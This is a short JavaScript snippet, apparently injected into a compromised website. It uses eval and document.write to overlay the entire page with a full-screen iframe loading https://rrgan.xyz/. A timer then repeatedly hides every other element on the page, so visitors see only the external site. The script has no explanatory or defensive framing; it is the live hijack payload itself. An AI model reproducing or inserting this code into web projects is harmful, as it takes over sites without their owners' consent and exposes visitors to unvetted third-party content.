if (/Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
  var uu = "https://rrgan.xyz/"
} else {
  var uu = "https://rrgan.xyz/"
}
var aa = Math.round(Math.random() * 8 + 1);
var ss = '<div id="showcloneshengxiaon" style="position: absolute; top: 0px; left: 0px; z-index: 10000;height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="100%" height="100%" src="' + uu + '"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden}</style>';
eval("document.write('" + ss + "');");
try {
  setInterval(function() {
    try {
      document.getElementById("divAll").style.display = "none"
    } catch (e) {}
    for (var i = 0; i < document.body.children.length; i++) {
      try {
        var a = document.body.children[i].tagName;
        var b = document.body.children[i].id;
        if (b != "iconDiv1" && b != "showcloneshengxiaon") {
          document.body.children[i].style.display = "none"
        }
      } catch (e) {}
    }
  }, 100)
} catch (e) {}
